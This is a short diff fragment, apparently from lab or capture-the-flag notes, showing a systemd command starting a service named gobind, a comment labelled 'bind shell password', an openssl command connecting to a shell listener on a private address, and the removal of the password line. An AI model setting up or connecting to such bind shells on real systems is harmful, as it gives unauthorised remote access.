@@ -17,4 +17,3 @@ sudo systemctl start gobind
 
 # bind shell password
 openssl s_client -connect 10.10.10.10:45778
-YaHerd2016!
